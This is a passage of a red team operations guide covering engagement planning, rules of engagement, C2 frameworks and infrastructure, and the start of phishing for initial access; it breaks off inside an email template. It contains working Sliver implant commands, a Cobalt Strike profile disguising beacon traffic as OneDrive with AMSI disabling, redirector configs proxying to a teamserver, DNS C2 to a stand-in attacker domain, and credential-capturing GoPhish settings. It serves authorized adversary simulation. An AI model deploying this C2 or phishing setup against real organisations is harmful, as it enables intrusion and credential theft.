# Red Team Operations — Planning, Execution, and Adversary Simulation

## Table of Contents

1. [Red Team vs Penetration Testing](#1-red-team-vs-penetration-testing)
2. [Red Team Planning](#2-red-team-planning)
3. [Command and Control Infrastructure](#3-command-and-control-infrastructure)
4. [Initial Access](#4-initial-access)
5. [Execution and Persistence](#5-execution-and-persistence)
6. [Lateral Movement and Pivoting](#6-lateral-movement-and-pivoting)
7. [Objective Completion](#7-objective-completion)
8. [Adversary Emulation](#8-adversary-emulation)
9. [Reporting and Debrief](#9-reporting-and-debrief)
10. [Lab: Red Team Campaign](#10-lab-red-team-campaign)

---

## 1. Red Team vs Penetration Testing

### 1.1 Scope and Objective Differences

The distinction between red team operations and penetration testing is not one of tools or skill sets — it is a fundamental difference in objectives, constraints, and success criteria.

**Penetration Testing** answers: "What vulnerabilities exist in this system/application/network?"

**Red Teaming** answers: "Can a determined adversary achieve specific business-impact objectives against our organization, and will our defenders detect and respond to the attempt?"

| Dimension | Penetration Testing | Red Team Operations |
|-----------|-------------------|-------------------|
| Primary objective | Find vulnerabilities | Achieve defined objectives while testing detection |
| Scope | Defined systems/applications | Entire organization (unless explicitly excluded) |
| Target knowledge | Blue team typically aware | Blue team unaware (tests real-world response) |
| Duration | Days to weeks | Weeks to months |
| Stealth requirement | Low/none — noisy scanning acceptable | High — detection = mission failure |
| Success metric | Vulnerability count/severity | Objectives achieved + detection gaps identified |
| Reporting focus | Vulnerability list with remediation | Attack narrative + detection gap analysis |
| Exploitation depth | Prove exploitability | Full attack chain to business impact |
| Rules of engagement | Technical boundaries | Adversary-realistic constraints |

A penetration test might discover that LSASS can be dumped on a workstation. A red team operation demonstrates that an APT can move from a phishing email to domain dominance to exfiltrating the CEO's inbox contents over three weeks without triggering a single SOC alert.

### 1.2 Rules of Engagement Differences

Penetration testing ROE focus on technical boundaries: which IPs, which ports, which applications, maximum scanning rate, testing windows.

Red team ROE define adversary realism constraints:

```
Red Team Rules of Engagement — Key Differences:
────────────────────────────────────────────────
1. Notification scope: Only C-suite + legal know. SOC/IR team uninformed.
2. Duration: Campaign window of [N weeks/months].
3. Stealth mandate: Detection triggers abort only if blue team formally escalates.
4. Allowed attack vectors: Physical, social engineering, network, application.
5. Excluded targets: Safety systems, medical devices, production databases.
6. Data handling: No real data exfiltrated — use markers/flags planted by engagement lead.
7. Physical access: Tailgating authorized, B&E not authorized.
8. Third-party interaction: May target vendor relationships per scope.
9. Abort criteria: Detection AND active containment by blue team = objective failed.
10. Deconfliction: Red team maintains timestamped activity log for IR deconfliction.
```

### 1.3 Duration and Stealth Requirements

Penetration tests operate on compressed timelines (1-4 weeks typically). Testers prioritize coverage over stealth. Running Nessus against a subnet is acceptable because the goal is vulnerability identification, not evasion testing.

Red team operations invert this priority:

- **Duration**: 4-12 weeks for a full campaign. Some continuous red teams operate year-round.
- **Stealth**: Every action is evaluated against "would a real adversary do this?" and "will this trigger an alert?"
- **Pacing**: Low-and-slow. An initial access operation might take 2 weeks of OSINT and infrastructure setup before the first phishing email.
- **Operational pauses**: After initial compromise, operators may wait days before moving laterally, mimicking real adversary dwell time patterns.

The stealth requirement directly constrains tooling choices. A pentester might use Mimikatz.exe dropped to disk. A red team operator reflectively loads custom credential harvesting tools that never touch disk, bypass AMSI, and clean up event logs.

### 1.4 Threat Intelligence-Driven Approach

Penetration testing is methodology-driven — follow PTES, OWASP, or OSSTMM step by step.

Red teaming is intelligence-driven — start with the threat landscape:

1. **Who targets this organization?** (Industry-specific APT groups)
2. **What are their objectives?** (IP theft, financial fraud, espionage, disruption)
3. **How do they operate?** (Specific TTPs mapped to MITRE ATT&CK)
4. **What capabilities do they possess?** (Custom malware, zero-days, social engineering)

The engagement then emulates those specific threats. A financial institution might commission a red team emulating FIN7's tactics. A defense contractor might face APT29 emulation. This intelligence-driven approach ensures the organization tests against realistic threats, not generic vulnerability scanning.

### 1.5 Adversary Emulation vs Vulnerability Assessment

These exist on a spectrum of realism and depth:

```
Vulnerability Assessment
    │ → Automated scanning, no exploitation
    │ → Identifies known CVEs and misconfigurations
    │ → Breadth over depth
    │
Penetration Testing
    │ → Confirms exploitability
    │ → Chains vulnerabilities for impact demonstration
    │ → Moderate depth, moderate breadth
    │
Red Team Operations
    │ → Full adversary emulation with specific objectives
    │ → Tests people, processes, and technology together
    │ → Maximum depth, targeted breadth
    │
Adversary Emulation (Purple Team)
      → Red executes known adversary TTPs
      → Blue observes and validates detection
      → Collaborative improvement focus
```

### 1.6 Purple Team Integration

Purple teaming is not a separate engagement type — it is a modality applied to red team operations. Specifically, it is what happens after (or during) a red team campaign when the red and blue teams collaborate.

**During-campaign purple teaming:**
- Red team provides real-time TTP disclosure to a purple team coordinator
- Coordinator feeds indicators to blue team without revealing red team identity
- Tests whether blue team can detect techniques when given contextual hints
- Measures time from indicator delivery to detection/containment

**Post-campaign purple teaming:**
- Red team walks blue team through every step of the attack chain
- Blue team correlates with their telemetry: what they saw, what they missed
- Jointly develop detection rules for gaps identified
- Validate new detections by re-running red team techniques in controlled fashion

### 1.7 Decision Matrix: When to Use What

| Scenario | Appropriate Assessment |
|----------|----------------------|
| New application going to production | Penetration test |
| Annual compliance requirement (PCI-DSS, SOC2) | Vulnerability assessment + pentest |
| Board wants to know "can someone steal our IP?" | Red team |
| SOC just deployed new EDR | Purple team |
| M&A due diligence on acquisition target | Vulnerability assessment |
| Post-breach: "could this happen again?" | Red team emulating the original threat |
| Testing IR procedures and playbooks | Red team (tabletop or live-fire) |
| Continuous security posture measurement | Automated adversary emulation platform |

---

## 2. Red Team Planning

### 2.1 Threat Intelligence — Understanding the Target's Threat Landscape

Before any technical planning begins, the red team lead must answer: "Who would actually attack this organization and why?"

**Intelligence sources:**
- MITRE ATT&CK groups mapped to target's industry vertical
- Threat intelligence feeds (commercial: Recorded Future, Mandiant; open: AlienVault OTX, MISP communities)
- Previous incident reports (if available under NDA)
- Industry-specific ISACs (Information Sharing and Analysis Centers)
- Public breach data for peer organizations
- Nation-state APT reports from CrowdStrike, Kaspersky GReAT, Microsoft MSTIC

**Threat landscape assessment template:**

```
Target: [Organization Name]
Industry: [Sector]
Geographic presence: [Countries]
Public-facing infrastructure: [Summary]

Likely threat actors:
┌─────────────────┬──────────────┬──────────────────────┬─────────────────────┐
│ Actor           │ Motivation   │ Primary TTPs         │ Historical Targets  │
├─────────────────┼──────────────┼──────────────────────┼─────────────────────┤
│ APT28           │ Espionage    │ Phishing, OAuth      │ Government, defense │
│ FIN7            │ Financial    │ Spearphishing, POS   │ Retail, hospitality │
│ Lazarus         │ Financial    │ Supply chain, crypto │ Financial, crypto   │
│ [Custom]        │ [Motivation] │ [TTPs]               │ [Sectors]           │
└─────────────────┴──────────────┴──────────────────────┴─────────────────────┘

Priority emulation target: [Selected actor]
Rationale: [Why this actor is most relevant]
```

### 2.2 Adversary Selection — Choosing TTP Sets to Emulate

Once the threat landscape is understood, select the specific adversary to emulate. This drives the entire campaign's technical approach.

**MITRE ATT&CK Navigator Integration:**

The ATT&CK Navigator allows layering threat actor TTPs over organizational defenses:

1. Create a layer for the selected threat group (e.g., APT29)
2. Create a layer for the organization's known detection capabilities
3. Overlay them — gaps where the actor operates but detection doesn't exist are priority targets

```json
{
    "name": "APT29 Emulation - Campaign Alpha",
    "versions": {
        "attack": "14",
        "navigator": "4.9",
        "layer": "4.5"
    },
    "domain": "enterprise-attack",
    "description": "APT29 TTP coverage for red team campaign",
    "techniques": [
        {
            "techniqueID": "T1566.001",
            "tactic": "initial-access",
            "color": "#ff0000",
            "comment": "Spearphishing attachment - primary initial access",
            "score": 100,
            "enabled": true
        },
        {
            "techniqueID": "T1059.001",
            "tactic": "execution",
            "color": "#ff6600",
            "comment": "PowerShell execution - post-compromise",
            "score": 80,
            "enabled": true
        },
        {
            "techniqueID": "T1053.005",
            "tactic": "persistence",
            "color": "#ff6600",
            "comment": "Scheduled Task persistence",
            "score": 80,
            "enabled": true
        },
        {
            "techniqueID": "T1003.001",
            "tactic": "credential-access",
            "color": "#ff0000",
            "comment": "LSASS memory credential dumping",
            "score": 100,
            "enabled": true
        }
    ],
    "gradient": {
        "colors": ["#ffffff", "#ff0000"],
        "minValue": 0,
        "maxValue": 100
    }
}
```

### 2.3 Campaign Planning — Objectives, Phases, Milestones, Abort Criteria

**Campaign phases:**

```
Phase 0: Planning & Infrastructure (Week 1-2)
├── Threat intelligence review
├── Adversary TTP selection
├── Infrastructure deployment
├── OPSEC review
└── Go/no-go decision

Phase 1: Reconnaissance (Week 2-3)
├── OSINT on target organization
├── Technical footprinting
├── Social engineering pretexts development
└── Target identification (individuals/systems)

Phase 2: Initial Access (Week 3-5)
├── Phishing campaign deployment
├── Alternative access vector attempts
└── Initial foothold establishment

Phase 3: Establish Persistence (Week 5-6)
├── Secondary persistence mechanisms
├── C2 channel validation
└── Operational security validation

Phase 4: Internal Operations (Week 6-9)
├── Internal reconnaissance
├── Privilege escalation
├── Lateral movement
└── Credential harvesting

Phase 5: Objective Completion (Week 9-10)
├── Crown jewel identification
├── Access demonstration
├── Data staging
└── Exfiltration simulation

Phase 6: Cleanup & Reporting (Week 10-12)
├── Implant removal
├── Artifact cleanup
├── Report drafting
└── Purple team debrief
```

**Abort criteria:**

| Condition | Action |
|-----------|--------|
| Blue team formally escalates and attributes activity to red team | Mission abort, proceed to debrief |
| Red team activity causes unintended production impact | Immediate stop, notify emergency contact |
| Legal/compliance issue discovered during operation | Pause, consult legal counsel |
| Third-party systems compromised outside scope | Halt lateral movement path, document, seek authorization |
| Physical safety concern during social engineering | Abort physical vector, fall back to remote |

### 2.4 Infrastructure Planning

Red team infrastructure must be purpose-built, disposable, and compartmentalized.

**Architecture diagram:**

```
                    ┌─────────────────────────────────────┐
                    │         OPERATOR WORKSTATION         │
                    │    (VPN → Redirector → Teamserver)   │
                    └─────────────┬───────────────────────┘
                                  │ SSH/VPN
                    ┌─────────────▼───────────────────────┐
                    │       MANAGEMENT REDIRECTOR          │
                    │  (Operator access only, jump box)    │
                    └─────────────┬───────────────────────┘
                                  │
         ┌────────────────────────┼───────────────────────┐
         │                        │                        │
┌────────▼────────┐   ┌──────────▼──────────┐   ┌───────▼────────┐
│  LONG-HAUL C2   │   │   SHORT-HAUL C2     │   │  PHISHING      │
│  TEAM SERVER    │   │   TEAM SERVER       │   │  INFRASTRUCTURE│
│  (Low/slow)     │   │   (Interactive)      │   │  (GoPhish +    │
│                 │   │                      │   │   SMTP relay)  │
└────────┬────────┘   └──────────┬──────────┘   └───────┬────────┘
         │                        │                      │
┌────────▼────────┐   ┌──────────▼──────────┐   ┌──────▼─────────┐
│  HTTPS REDIR    │   │   HTTPS REDIR       │   │  MAIL REDIR    │
│  (CDN fronted)  │   │   (Direct domain)   │   │  (SPF/DKIM)    │
└────────┬────────┘   └──────────┬──────────┘   └──────┬─────────┘
         │                        │                      │
         └────────────────────────┼──────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │         TARGET ORGANIZATION          │
                    └─────────────────────────────────────┘
```

**Infrastructure components:**

- **C2 Teamserver**: The actual C2 framework (Cobalt Strike, Sliver, Mythic) — never directly internet-facing
- **Redirectors**: Forward traffic from categorized domains to teamserver; disposable if burned
- **Phishing infrastructure**: Separate mail servers with proper DNS records (SPF, DKIM, DMARC)
- **VPN/Jump boxes**: Operator access layer; all operator traffic through these nodes
- **Payload hosting**: Separate web servers for hosting staged payloads
- **Exfiltration infrastructure**: Dedicated channel for data staging and exfil simulation

### 2.5 OPSEC Planning — Avoiding Detection During Engagement

Operational Security for red teams means preventing attribution of activity back to the red team, or worse, causing the target to attribute it to a real threat and trigger expensive incident response.

**OPSEC principles for operators:**

1. **Separate operational and personal infrastructure** — never mix red team browsing with personal accounts on the same VM
2. **Domain categorization** — all C2 domains must be categorized (finance, tech, healthcare) before use; freshly registered uncategorized domains are instant red flags
3. **Certificate management** — use legitimate TLS certificates (Let's Encrypt) on all listener infrastructure
4. **Traffic patterns** — C2 callbacks should mimic business-hour patterns; no beaconing at 0300 local time unless the target has 24/7 operations
5. **Artifact management** — compile payloads on isolated build machines; strip debug symbols and paths
6. **Communication security** — all operator coordination via encrypted channels (Signal, encrypted Mattermost)
7. **Evidence preservation** — timestamp all activities (UTC ISO 8601); maintain forensic-grade activity logs

**OPSEC checklist before campaign launch:**

```
[ ] All domains aged >30 days and categorized
[ ] TLS certificates valid and issued by trusted CA
[ ] C2 profiles customized (not default Cobalt Strike profile)
[ ] No infrastructure linked to red team company's ASN
[ ] Separate browser profiles for OSINT (no login state contamination)
[ ] VPN exit points geographically appropriate for pretext
[ ] Payload build environment sanitized (no usernames/paths in binaries)
[ ] Activity logging configured and verified on all operator machines
[ ] Kill switch tested on all implants
[ ] Deconfliction artifact (unique string) embedded in payloads
```

### 2.6 Legal and Ethical Framework

Red team operations exist within a legal framework that must be ironclad before any technical activity begins.

**Authorization documentation:**

| Document | Purpose | Signatories |
|----------|---------|-------------|
| Master Service Agreement | Legal relationship, liability, indemnification | Legal counsel (both parties) |
| Statement of Work | Specific campaign scope, timeline, objectives | Engagement lead + authorizing executive |
| Rules of Engagement | Technical/operational boundaries | Red team lead + CISO/CTO |
| Authorization Letter | Legal defense against criminal charges | CEO/General Counsel |
| Data Handling Agreement | How captured data is stored, retained, destroyed | DPO/Privacy Officer |
| Third-Party Notification | Cloud provider/ISP awareness (if required) | As required by T&C |

**Data handling rules:**

- Never exfiltrate real PII, PHI, PCI, or classified data
- Use flags/markers planted specifically for the engagement
- If real sensitive data is inadvertently accessed, document access, do not copy, notify engagement coordinator
- All engagement data encrypted at rest (AES-256) on red team systems
- Data retention: destroy all captured data within 30 days of report delivery (or per contract)
- Screenshots containing sensitive data: redact before inclusion in reports

---

## 3. Command and Control Infrastructure

### 3.1 C2 Frameworks

#### Cobalt Strike Architecture

Cobalt Strike remains the most widely used commercial red team platform. Its architecture:

```
┌──────────────────────────────────────────────────┐
│                  COBALT STRIKE                     │
├──────────────────────────────────────────────────┤
│                                                   │
│  Team Server (teamserver)                         │
│  ├── Listener Manager                             │
│  │   ├── HTTPS Listener (port 443)               │
│  │   ├── DNS Listener (port 53)                  │
│  │   ├── SMB Named Pipe Listener (internal)      │
│  │   └── TCP Listener (bind/reverse)             │
│  ├── Beacon Handler                               │
│  │   ├── Sleep/jitter management                 │
│  │   ├── Task queue per beacon                   │
│  │   └── Session management                      │
│  ├── Malleable C2 Profile Engine                  │
│  ├── Payload Generator                            │
│  │   ├── Stageless payloads                      │
│  │   ├── Staged payloads                         │
│  │   └── Shellcode generator                     │
│  └── Logging Engine                               │
│                                                   │
│  Aggressor Script Engine                          │
│  ├── Event hooks                                 │
│  ├── Custom commands                             │
│  └── Automation scripts                          │
│                                                   │
│  Client (cobaltstrike.jar)                        │
│  ├── Session interaction                         │
│  ├── Visualization (pivot graph, target table)   │
│  └── Multi-operator support                      │
│                                                   │
└──────────────────────────────────────────────────┘
```

**Key Cobalt Strike concepts:**
- **Beacon**: The implant deployed to targets; supports sleep intervals with jitter, multiple C2 channels, in-memory execution
- **Malleable C2**: Profile language that defines how beacon traffic looks on the wire (HTTP headers, URI patterns, data encoding)
- **Aggressor Script**: Scripting engine for automating post-exploitation, creating custom commands, and event-driven actions
- **Artifact Kit**: Customizable payload generation to evade static signatures
- **UDRL (User Defined Reflective Loader)**: Custom reflective DLL loader to bypass memory scanners

#### Sliver

Sliver is an open-source C2 framework written in Go by BishopFox:

- Implants compiled per-target as static Go binaries (cross-platform: Windows, Linux, macOS)
- Supports mTLS, WireGuard, HTTP(S), and DNS C2 channels
- Multiplayer mode with operator authentication
- Armory: extension/plugin system for BOFs and third-party tools
- Implant obfuscation via Garble (Go compiler-level obfuscation)
- Staged and stageless implants
- Pivot listeners for internal lateral movement

```bash
# Generate a Sliver implant
sliver > generate --mtls my-redirector.com --os windows \
    --arch amd64 --format exe --name FINANCE_UPDATE \
    --skip-symbols --debug

# Generate stager
sliver > generate stager --lhost 10.10.10.1 --lport 8443 \
    --protocol tcp --os windows --arch amd64 --format raw

# Start mTLS listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Start HTTP listener with custom parameters
sliver > http --lhost 0.0.0.0 --lport 443 \
    --domain cdn-assets.legitimatedomain.com \
    --website updates
```

#### Mythic

Mythic is a multi-platform, multi-agent C2 framework with a web-based UI:

- Agent-agnostic: supports multiple payload types (Apollo/.NET, Athena/C#, Poseidon/Go, Medusa/Python)
- Docker-based deployment for easy infrastructure management
- MITRE ATT&CK integration for technique tracking
- Encrypted agent communications with per-agent encryption keys
- Task queue with full audit logging
- C2 profile customization per payload type
- Browser script engine for output parsing and automation

#### Havoc

Havoc is a modern, post-exploitation command and control framework:

- Demon agent: position-independent shellcode-based implant
- Supports direct and indirect syscalls for EDR evasion
- Sleep obfuscation (stack encryption during sleep)
- Custom loader with multiple injection techniques
- BOF (Beacon Object File) support for in-memory execution
- Module system for extending functionality

#### Brute Ratel C4 (BRc4)

Brute Ratel focuses specifically on EDR evasion:

- Badger agent with advanced evasion capabilities
- Direct syscalls and unhooking
- ETW/AMSI patching built-in
- Sleep mask with stack spoofing
- Custom crypter with each license
- SMB/TCP/HTTP/HTTPS/DNS communication channels

### 3.2 Malleable C2 Profiles — Customizing Beacon Behavior

Malleable C2 profiles define the network signature of C2 traffic. A well-crafted profile makes beacon traffic indistinguishable from legitimate application traffic.

**Example: Microsoft Teams/OneDrive traffic emulation profile:**

```
# Malleable C2 Profile - OneDrive Traffic Emulation
# For Cobalt Strike

set sample_name "OneDrive Sync Client";
set sleeptime "60000";      # 60 second default sleep
set jitter "37";            # 37% jitter
set useragent "Microsoft SkyDriveSync 17.3.7294.0108 ship; Windows NT 10.0 (16299)";
set data_jitter "100";

# HTTPS Certificate
https-certificate {
    set C "US";
    set CN "*.onedrive.live.com";
    set O "Microsoft Corporation";
    set OU "Microsoft IT";
    set ST "Washington";
    set validity "365";
}

# HTTP GET - Beacon check-in
http-get {
    set uri "/v1.0/drive/root:/Documents";

    client {
        header "Host" "onedrive.live.com";
        header "Accept" "application/json";
        header "Connection" "keep-alive";

        metadata {
            base64url;
            prepend "Bearer ";
            header "Authorization";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Server" "Microsoft-IIS/10.0";
        header "X-Content-Type-Options" "nosniff";
        header "X-MS-Request-Id" "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

        output {
            base64url;
            prepend "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#drives\",\"value\":[{\"id\":\"";
            append "\"}]}";
            print;
        }
    }
}

# HTTP POST - Beacon task results
http-post {
    set uri "/v1.0/drive/items/upload.aspx";
    set verb "POST";

    client {
        header "Host" "onedrive.live.com";
        header "Content-Type" "application/octet-stream";

        id {
            base64url;
            prepend "session-";
            header "X-Upload-Session";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "Microsoft-IIS/10.0";

        output {
            base64url;
            prepend "{\"status\":\"completed\",\"uploadUrl\":\"";
            append "\"}";
            print;
        }
    }
}

# Process injection configuration
process-inject {
    set allocator "NtMapViewOfSection";
    set bof_allocator "VirtualAlloc";
    set min_alloc "17500";
    set startrwx "false";
    set userwx "false";

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

# Post-exploitation
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "mojo.5688.8052.183894939787088877##";
    set keylogger "GetAsyncKeyState";
}
```

### 3.3 Redirector Infrastructure

Redirectors sit between the target and the teamserver. If compromised or detected, they are burned and replaced without exposing the backend C2.

**Apache mod_rewrite redirector:**

```apache
# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    ServerName cdn-static.legitimate-looking-domain.com

    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/cdn-static.legitimate-looking-domain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/cdn-static.legitimate-looking-domain.com/privkey.pem

    # Enable rewrite engine
    RewriteEngine On

    # Block known sandbox/AV user agents
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|bot|crawl) [NC]
    RewriteRule ^.*$ https://www.microsoft.com/en-us/microsoft-365 [L,R=302]

    # Block non-target IP ranges (only allow target org's egress IPs)
    RewriteCond %{REMOTE_ADDR} !^203\.0\.113\.(0|[1-9][0-9]?|1[0-9]{2}|2[0-4][0-9]|25[0-5])$
    RewriteRule ^.*$ https://www.microsoft.com/en-us/microsoft-365 [L,R=302]

    # Proxy valid C2 traffic to teamserver
    RewriteCond %{HTTP_USER_AGENT} "Microsoft SkyDriveSync.*" [NC]
    RewriteRule ^/v1.0/drive/(.*)$ https://TEAMSERVER_IP:443/v1.0/drive/$1 [P,L]

    # Default: redirect to legitimate site
    RewriteRule ^.*$ https://www.microsoft.com/en-us/microsoft-365 [L,R=302]

    # Proxy settings
    SSLProxyEngine on
    ProxyPreserveHost on
</VirtualHost>
```

**Nginx redirector with rate limiting and geofencing:**

```nginx
# /etc/nginx/conf.d/c2-redirector.conf
upstream teamserver {
    server TEAMSERVER_INTERNAL_IP:443;
}

# GeoIP-based blocking (only allow target country)
geo $blocked_country {
    default 1;
    # Allow US-based IPs only (target org location)
    include /etc/nginx/geoip-us-ranges.conf;
}

# Rate limiting
limit_req_zone $binary_remote_addr zone=c2limit:10m rate=10r/m;

server {
    listen 443 ssl http2;
    server_name cdn-static.legitimate-looking-domain.com;

    ssl_certificate /etc/letsencrypt/live/cdn-static.legitimate-looking-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-static.legitimate-looking-domain.com/privkey.pem;

    # Block non-target countries
    if ($blocked_country) {
        return 302 https://www.microsoft.com;
    }

    # Validate C2 URI pattern
    location ~ ^/v1\.0/drive/ {
        limit_req zone=c2limit burst=5 nodelay;

        # Validate expected headers
        if ($http_user_agent !~* "Microsoft SkyDriveSync") {
            return 302 https://www.microsoft.com;
        }

        proxy_pass https://teamserver;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Everything else goes to decoy
    location / {
        return 302 https://www.microsoft.com;
    }
}
```

**CDN-based domain fronting (where still viable):**

Domain fronting uses a CDN's infrastructure to mask C2 traffic. The outer TLS SNI and Host header point to a high-reputation domain on the same CDN, while the inner HTTP Host header directs to the red team's CDN-hosted endpoint.

Note: Major cloud providers (AWS CloudFront, Google Cloud CDN, Azure CDN) have largely blocked domain fronting. Alternatives include domain borrowing (using subdomains of legitimate CDN customers) and cloud function redirectors.

### 3.4 DNS C2 Channels

DNS C2 uses DNS queries and responses to tunnel C2 communications. Advantages: DNS is rarely blocked, often not inspected, and proxied through trusted infrastructure.

```
Beacon → DNS Query:
    aGVsbG8gd29ybGQ.data.c2-subdomain.attacker-domain.com  (TXT query)
                                    │
                    ┌───────────────▼────────────────────┐
                    │   Authoritative DNS Server (NS)     │
                    │   for attacker-domain.com           │
                    │   (Decodes query, returns response) │
                    └───────────────┬────────────────────┘
                                    │
Beacon ← DNS Response:             │
    TXT "dGFzayBkYXRh..."         ◄┘
```

**Sliver DNS C2 configuration:**

```bash
# Start DNS listener
sliver > dns --domains c2.red-team-domain.com --lport 53 --no-canaries

# Generate DNS implant
sliver > generate --dns c2.red-team-domain.com --os windows \
    --arch amd64 --format exe --name DNS_BEACON
```

**DNS record setup for DNS C2:**

```
; Zone file additions for c2.red-team-domain.com
; NS record pointing to your DNS C2 server
c2    IN    NS    ns1.red-team-domain.com.
ns1   IN    A     YOUR_DNS_C2_SERVER_IP
```

### 3.5 Communication Security

All inter-operator and management communications must be encrypted:

- **Operator ↔ Teamserver**: SSH tunnels or WireGuard VPN; never expose teamserver management ports to internet
- **Teamserver ↔ Redirector**: mTLS or WireGuard mesh
- **Operator ↔ Operator**: Signal/Wire for real-time; PGP-encrypted email for formal communications
- **Logs and evidence**: Encrypted volumes (LUKS/Veracrypt); access controlled by hardware tokens

**Certificate pinning for C2:**

```python
# Python example: certificate pinning for custom C2 client
import ssl
import hashlib
import socket

EXPECTED_CERT_HASH = "sha256:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"

def verify_certificate(host, port):
    """Verify C2 server certificate matches expected fingerprint."""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            cert_binary = ssock.getpeercert(binary_form=True)
            cert_hash = hashlib.sha256(cert_binary).hexdigest()
            expected = EXPECTED_CERT_HASH.split(":")[1]

            if cert_hash != expected:
                raise ssl.SSLError(
                    f"Certificate mismatch. Got: {cert_hash}"
                )
            return True
```

### 3.6 Infrastructure Automation — Terraform for Red Team Infra

Infrastructure-as-code ensures reproducible, disposable red team environments:

```hcl
# terraform/main.tf — Red Team Infrastructure
terraform {
  required_providers {
    digitalocean = {
      source  = "digitalocean/digitalocean"
      version = "~> 2.0"
    }
    cloudflare = {
      source  = "cloudflare/cloudflare"
      version = "~> 4.0"
    }
  }
}

variable "campaign_name" {
  default = "operation-alpha"
}

variable "c2_domain" {
  default = "cdn-static-assets.com"
}

# Long-haul C2 teamserver
resource "digitalocean_droplet" "teamserver" {
  image    = "ubuntu-22-04-x64"
  name     = "${var.campaign_name}-ts"
  region   = "nyc1"
  size     = "s-2vcpu-4gb"
  ssh_keys = [digitalocean_ssh_key.operator.fingerprint]

  connection {
    type        = "ssh"
    user        = "root"
    private_key = file("~/.ssh/redteam_ed25519")
    host        = self.ipv4_address
  }

  provisioner "remote-exec" {
    inline = [
      "apt-get update && apt-get install -y docker.io docker-compose",
      "ufw default deny incoming",
      "ufw allow from ${digitalocean_droplet.redirector_https.ipv4_address}",
      "ufw allow from ${var.operator_vpn_ip}",
      "ufw enable"
    ]
  }
}

# HTTPS Redirector
resource "digitalocean_droplet" "redirector_https" {
  image    = "ubuntu-22-04-x64"
  name     = "${var.campaign_name}-redir-https"
  region   = "nyc1"
  size     = "s-1vcpu-1gb"
  ssh_keys = [digitalocean_ssh_key.operator.fingerprint]

  provisioner "remote-exec" {
    inline = [
      "apt-get update && apt-get install -y nginx certbot python3-certbot-nginx",
      "certbot certonly --standalone -d ${var.c2_domain} --agree-tos -m ops@redteam.local --non-interactive"
    ]
  }
}

# Phishing server
resource "digitalocean_droplet" "phishing" {
  image    = "ubuntu-22-04-x64"
  name     = "${var.campaign_name}-phish"
  region   = "nyc1"
  size     = "s-1vcpu-2gb"
  ssh_keys = [digitalocean_ssh_key.operator.fingerprint]

  provisioner "remote-exec" {
    inline = [
      "apt-get update && apt-get install -y docker.io",
      "docker pull gophish/gophish:latest",
      "docker run -d --name gophish -p 3333:3333 -p 8080:80 -p 8443:443 gophish/gophish"
    ]
  }
}

# DNS records
resource "cloudflare_record" "c2_a" {
  zone_id = var.cloudflare_zone_id
  name    = "cdn-static"
  value   = digitalocean_droplet.redirector_https.ipv4_address
  type    = "A"
  proxied = false
}

resource "cloudflare_record" "phish_a" {
  zone_id = var.cloudflare_zone_id
  name    = "mail"
  value   = digitalocean_droplet.phishing.ipv4_address
  type    = "A"
  proxied = false
}

# SPF record for phishing domain
resource "cloudflare_record" "phish_spf" {
  zone_id = var.cloudflare_zone_id
  name    = "@"
  value   = "v=spf1 ip4:${digitalocean_droplet.phishing.ipv4_address} -all"
  type    = "TXT"
  proxied = false
}

output "teamserver_ip" {
  value     = digitalocean_droplet.teamserver.ipv4_address
  sensitive = true
}

output "redirector_ip" {
  value = digitalocean_droplet.redirector_https.ipv4_address
}

output "phishing_ip" {
  value = digitalocean_droplet.phishing.ipv4_address
}
```

---

## 4. Initial Access

### 4.1 Phishing — Infrastructure, Payload, Delivery, Tracking

Phishing remains the most common initial access vector for red teams because it targets the human layer, which no technical control fully mitigates.

**Phishing infrastructure checklist:**

1. Domain selection (typosquatting, lookalike, expired domains with history)
2. DNS configuration (SPF, DKIM, DMARC — passing alignment)
3. Mail server (Postfix/GoPhish SMTP)
4. Landing page (credential harvester or payload delivery)
5. Tracking pixels (open tracking)
6. Link tracking (click tracking with unique tokens)

**GoPhish campaign setup:**

```json
{
    "name": "Campaign-Q4-FinanceUpdate",
    "template": {
        "name": "Finance Portal Update",
        "subject": "Action Required: Updated Finance Portal Access",
        "html": "<html><body>...</body></html>",
        "attachments": []
    },
    "landing_page": {
        "name": "SSO Login Page",
        "html": "...",
        "capture_credentials": true,
        "capture_passwords": true,
        "redirect_url": "https://real-finance-portal.target.com"
    },
    "sending_profile": {
        "name": "Finance IT",
        "from_address": "it-finance@legitimatedomain.com",
        "host": "mail.legitimatedomain.com:587",
        "username": "phish@legitimatedomain.com"
    },
    "groups": [
        {"name": "Finance Department - Tier 1"}
    ],
    "launch_date": "2024-03-15T09:00:00-05:00",
    "send_by_date": "2024-03-15T12:00:00-05:00"
}
```

**Phishing email template (credential harvesting pretext):**

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body style="font-family: Segoe UI, sans-serif; max-width: 600px; margin: auto;">
    <div style="background: #0078d4; padding: 20px; text-align: center;">
        <img src="https://cdn-static.legitimatedomain.com/logo.png" 
             alt="Company Logo" style="height: 40px;">
    </div>
    <div style="padding: 30px; background: #ffffff; border: 1px solid #e0e0e0;">
